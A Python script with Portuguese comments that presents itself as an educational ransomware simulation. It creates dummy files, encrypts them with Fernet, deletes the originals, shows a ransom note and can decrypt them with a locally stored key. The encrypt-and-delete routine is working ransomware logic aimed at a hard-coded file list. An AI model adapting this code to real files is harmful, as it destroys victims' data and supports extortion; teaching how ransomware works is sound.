import os
from cryptography.fernet import Fernet


KEY_FILE = "chave_secreta_teste.key"
ENCRYPTED_EXTENSION = ".criptografado"
TARGET_FILES = [
    "documento_teste_1.txt",
    "documento_teste_2.docx_simulado",
    "dados_importantes_3.db_simulado"
]


def create_key():
    """Gera uma nova chave Fernet e a salva em um arquivo."""
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as key_file:
        key_file.write(key)
    return key

def load_key():
    """Carrega a chave Fernet do arquivo."""
    if os.path.exists(KEY_FILE):
        return open(KEY_FILE, "rb").read()
    return None

def create_dummy_files():
    """Cria arquivos de teste na pasta atual."""
    print("--- Criando Arquivos de Teste ---")
    for filename in TARGET_FILES:
        if not os.path.exists(filename):
            with open(filename, "w") as f:
                f.write(f"Este é o conteúdo original do arquivo {filename}.\n")
                f.write("Sequestro de dados simulado para fins educacionais.\n")
            print(f"Criado: {filename}")
    print("---------------------------------")


def encrypt_files(key):
    """Criptografa a lista de arquivos alvo."""
    f = Fernet(key)
    
    print("\n--- Criptografando Arquivos ---")
    files_encrypted = 0
    for filename in TARGET_FILES:
        try:
            if os.path.exists(filename) and not filename.endswith(ENCRYPTED_EXTENSION):
                with open(filename, "rb") as file:
                    file_data = file.read()
                
                encrypted_data = f.encrypt(file_data)
                
                new_filename = filename + ENCRYPTED_EXTENSION
                with open(new_filename, "wb") as file:
                    file.write(encrypted_data)
                
                os.remove(filename)
                print(f"Criptografado: {filename} -> {new_filename}")
                files_encrypted += 1
        except Exception as e:
            print(f"ERRO ao criptografar {filename}: {e}")
            
    if files_encrypted > 0:
        display_ransom_note()
        
    print("-------------------------------")

def decrypt_files(key):
    """Descriptografa todos os arquivos com a extensão criptografada."""
    f = Fernet(key)
    
    print("\n--- Descriptografando Arquivos ---")
    files_decrypted = 0
    
    encrypted_files = [f for f in os.listdir('.') if f.endswith(ENCRYPTED_EXTENSION)]
    
    for filename in encrypted_files:
        try:
            with open(filename, "rb") as file:
                encrypted_data = file.read()
            
            decrypted_data = f.decrypt(encrypted_data)
            
            original_filename = filename.replace(ENCRYPTED_EXTENSION, "")
            with open(original_filename, "wb") as file:
                file.write(decrypted_data)
            
            os.remove(filename)
            print(f"Descriptografado: {filename} -> {original_filename}")
            files_decrypted += 1
        except Exception as e:
            print(f"ERRO ao descriptografar {filename}. A chave pode estar incorreta. Erro: {e}")
            
    print("---------------------------------")
    if files_decrypted > 0:
        print("SISTEMA DE RECUPERAÇÃO CONCLUÍDO. Todos os arquivos foram restaurados.")
        os.remove(KEY_FILE)
    else:
        print("Nenhum arquivo criptografado encontrado ou a descriptografia falhou.")


def display_ransom_note():
    """Exibe a mensagem de 'resgate'."""
    print("\n" + "="*50)
    print("             !! ATENÇÃO: SEUS ARQUIVOS FORAM SEQUESTRADOS !!")
    print("="*50)
    print("Este é um RANSOMWARE SIMULADO, parte de um projeto educacional.")
    print("Em um ataque real, você precisaria de uma chave secreta para recuperar")
    print("seus dados. No nosso exercício, a chave está guardada no arquivo:")
    print(f"--> {KEY_FILE}")
    print("\nPara DESCRIPTOGRAFAR, execute o script novamente com a opção 'descriptografar'.")
    print("="*50 + "\n")


if __name__ == "__main__":
    import sys
    
    key = load_key()
    if not key:
        print("Chave de criptografia não encontrada. Gerando nova chave...")
        key = create_key()


    if len(sys.argv) == 1:
        create_dummy_files()
        print("\nPara criptografar, use: python ransomware.py criptografar")
        print("Para descriptografar, use: python ransomware.py descriptografar")
    
    elif sys.argv[1].lower() == "criptografar":
        if not key:
            print("ERRO: Chave de criptografia não encontrada. Não é possível criptografar.")
        else:
            encrypt_files(key)
            
    elif sys.argv[1].lower() == "descriptografar":
        if not key:
            print("ERRO: Chave de descriptografia não encontrada. Não é possível descriptografar.")
        else:
            decrypt_files(key)
            
    else:
        print("Comando inválido. Use 'criptografar' ou 'descriptografar'.")